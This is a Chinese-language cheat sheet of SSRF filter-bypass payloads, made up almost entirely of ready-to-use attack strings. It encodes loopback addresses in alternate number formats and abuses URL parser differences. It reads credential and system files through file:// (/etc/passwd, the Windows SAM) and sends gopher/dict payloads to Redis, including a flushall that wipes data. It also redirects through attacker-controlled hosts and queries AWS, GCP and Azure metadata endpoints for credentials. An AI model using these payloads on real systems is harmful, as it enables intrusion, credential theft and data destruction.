# SSRF WAF 绕过技术

## IP 格式绕过

### 不同进制

```
# 十进制
http://2130706433          # 127.0.0.1
http://3232235521          # 192.168.0.1
http://16885952            # 10.0.0.1

# 八进制
http://0177.0.0.1
http://017700000001
http://0177.0000.0000.0001

# 十六进制
http://0x7f000001
http://0x7f.0x00.0x00.0x01
http://0x7f.0.0.1

# 混合进制
http://0x7f.0.0.1
http://127.0x0.1
http://127.0.0x1
http://0177.0x0.1
```

### IPv6 格式

```
# IPv6 回环地址
http://[::1]
http://[::1]:80
http://[0:0:0:0:0:0:0:1]
http://[0000::1]
http://[0:0:0:0:0:0:127.0.0.1]
http://[::ffff:127.0.0.1]
http://[::ffff:7f00:1]

# IPv6 映射 IPv4
http://[0:0:0:0:0:ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:7f00:0001]

# 省略写法
http://[::127.0.0.1]
http://[::ffff:7f00:1]
```

### IP 省略

```
# 省略 0
http://127.1
http://127.0.1
http://10.1
http://192.168.1

# 省略前导零
http://127.000.000.001
http://010.000.000.001
```

### 特殊 IP

```
# 0.0.0.0
http://0.0.0.0
http://0
http://0000

# 本地域名
http://localtest.me
http://localhost
http://localhost.localdomain
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://localtest.me

# 广播地址
http://255.255.255.255
http://0.0.0.0
```

## DNS 绕过

### DNS 重绑定

```
# 原理：第一次解析返回公网IP，第二次返回内网IP

# 使用服务商
# https://lock.cmpxchg8b.com/rebinder.html
# https://portswigger.net/web-security/ssrf

# 自建 DNS 服务器
# 配置 TTL=0
# 第一次查询返回公网IP
# 第二次查询返回内网IP
```

### 内网 IP 域名

```
# 公网解析为内网IP
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://[::1].nip.io
http://localtest.me
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://spoofed.burpcollaborator.net

# 短域名服务
http://localtest.me
http://localhost.lv
```

### DNS 记录类型

```
# A 记录
http://attacker-a-record.com  # 指向 127.0.0.1

# CNAME 记录
http://attacker-cname.com     # CNAME 到 localhost

# 使用 DNSLog
http://attacker.dnslog.cn
http://xxx.ceye.io
```

## URL 解析绕过

### @ 符号

```
# URL 格式：protocol://user:pass@host:port/path
http://attacker.com@127.0.0.1
http://attacker.com:80@127.0.0.1
http://127.0.0.1#@attacker.com
http://attacker.com#@127.0.0.1

# 认证绕过
http://admin:admin@127.0.0.1
http://%2d%2d@127.0.0.1
```

### # 符号

```
# Fragment 绕过
http://127.0.0.1#@attacker.com
http://attacker.com#@127.0.0.1

# 不同解析器处理不同
# 浏览器: 发送到 attacker.com
# 后端: 发送到 127.0.0.1
```

### 反斜杠

```
http://127.0.0.1\@attacker.com
http://attacker.com\@127.0.0.1
http://127.0.0.1\attacker.com

# 不同服务器处理不同
# IIS: 反斜杠作为路径分隔符
# Apache: 反斜杠作为普通字符
```

### URL 编码

```
# 编码 IP
http://%31%32%37%2e%30%2e%30%2e%31        # 127.0.0.1
http://127%2e0%2e0%2e1

# 编码协议
%68%74%74%70://127.0.0.1

# 编码端口
http://127.0.0.1:%38%30

# 双重编码
http://%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31
```

### 协议绕过

```
# 大小写混合
HttP://127.0.0.1
FILE:///etc/passwd

# 协议缺失
//127.0.0.1
///127.0.0.1
/\\127.0.0.1

# 协议嵌套
http:http://127.0.0.1
http:///127.0.0.1
```

## 协议利用

### file 协议

```
# Linux
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/self/cwd

# Windows
file:///c:/windows/win.ini
file:///c:/windows/system32/config/sam
```

### dict 协议

```
# Redis
dict://127.0.0.1:6379/info
dict://127.0.0.1:6379/keys:*
dict://127.0.0.1:6379/config:get:dir

# Memcached
dict://127.0.0.1:11211/stats
```

### gopher 协议

```
# HTTP 请求
gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1%0AHost:%20localhost%0A%0A

# Redis 命令
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$8%0d%0atestdata%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# MySQL 命令 (需要构造MySQL协议)
gopher://127.0.0.1:3306/...
```

### 其他协议

```
# ldap
ldap://attacker.com/cn=test

# sftp
sftp://attacker.com:22/

# tftp
tftp://attacker.com:69/test

# 压缩文件
zip://archive.zip#file.txt
phar://archive.phar/file.txt
```

## 重定向绕过

### HTTP 重定向

```
# 服务端重定向
http://attacker.com/redirect?url=http://127.0.0.1
http://attacker.com/redirect?url=http://169.254.169.254

# 多重重定向
http://attacker.com/r1?url=http://attacker.com/r2?url=http://127.0.0.1

# 使用短链接
http://bit.ly/xxxxxx  # 重定向到 http://127.0.0.1
```

### HTML 重定向

```
# Meta 标签
http://attacker.com/meta.html
# <meta http-equiv="refresh" content="0;url=http://127.0.0.1">

# JavaScript
http://attacker.com/js.html
# <script>window.location="http://127.0.0.1"</script>
```

### 协议重定向

```
# HTTP -> file
# 某些服务器会跟随重定向到 file://

# HTTP -> gopher
# 某些服务器支持重定向到 gopher://
```

## 云环境绕过

### AWS

```
# IMDSv1
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document

# IMDSv2 (需要先获取 token)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# 绕过 IMDSv2
# 某些情况可以通过 SSRF 发送 PUT 请求
```

### GCP

```
http://metadata.google.internal/computeMetadata/v1/
# 需要 Header: Metadata-Flavor: Google

# 绕过方法
# 1. 通过 SSRF 发送带 Header 的请求
# 2. 使用 gopher 协议构造请求
```

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# 需要 Header: Metadata: true

# 绕过方法
# 使用 gopher 协议构造请求
```

## 绕过检测清单

```
1. IP 格式变换
   - 十进制/八进制/十六进制
   - IPv6 格式
   - IP 省略

2. DNS 绕过
   - DNS 重绑定
   - 内网 IP 域名
   - DNSLog

3. URL 解析差异
   - @ 符号
   - # 符号
   - 反斜杠
   - URL 编码

4. 协议利用
   - file/dict/gopher
   - 大小写混合
   - 协议缺失

5. 重定向
   - HTTP 重定向
   - HTML 重定向
   - 协议重定向

6. 云环境
   - 元数据服务
   - IMDS 绕过
```